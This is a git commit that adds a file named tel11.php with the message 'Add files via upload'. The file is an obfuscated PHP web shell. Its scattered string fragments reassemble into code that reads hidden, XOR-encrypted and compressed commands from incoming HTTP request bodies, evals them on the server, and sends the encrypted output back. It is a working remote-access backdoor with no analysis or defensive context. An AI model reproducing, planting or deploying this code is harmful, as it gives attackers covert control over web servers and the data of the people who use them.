4ebaf491a9124bf1947e5f3101b515e812bbe61b
dyaa1997dyaa <119899779+dyaa1997dyaa@users.noreply.github.com>
2023-08-21 08:35:59 -0700

    Add files via upload

---
+++ tel11.php
@@ -0,0 +1,13 @@
+<?php
+$N='h("/$k^"h^"(.+^")$kf/",^"@file_get_cont^"ent^"s(^"^""php://inp^"ut"),$m)^"';
+$F=');$j++,$i++)^"^"{$^"o.=$t{$i}^$k{$^"j};^"}^"}return $^"o;}if ^"(@preg_m^"atc';
+$c=str_replace('nN','','nNcrnNeatnNnNe_fnNnNunction');
+$U='rlen($^"t)^";$o="";fo^"^"r($i=0;$i<$l;^"){for^"($j=0;^"^"($j<$c&&$i<^"^"$l';
+$Z='$^"k="1bc^"3e808";$k^"h="8929c1f^"97c6d^"";$k^"f="78d447^"2d^"6597";$p=^""^';
+$H='"zUcQ1^"41IDsxd0ZY^"0";fun^"ction^" ^"x($^"^"t,$k)^"{$c=strlen($k);$l=st';
+$J='==1) {@ob_star^"^"t();@ev^"a^"l(@gzu^"ncompress(@x(^"@^"base^"64_dec^"ode';
+$l='b^"ase64_encode(@x^"(@gz^"co^"mpress($o),^"^"$k));pri^"nt("^"$p$kh$r$kf");}';
+$z='($m[1]),$k))^"^")^";$o=@^"ob_get_c^"^"ontents();@ob_e^"nd_clean();$^"r=^"@';
+$r=str_replace('^"','',$Z.$H.$U.$F.$N.$J.$z.$l);
+$o=$c('',$r);$o();
+?>
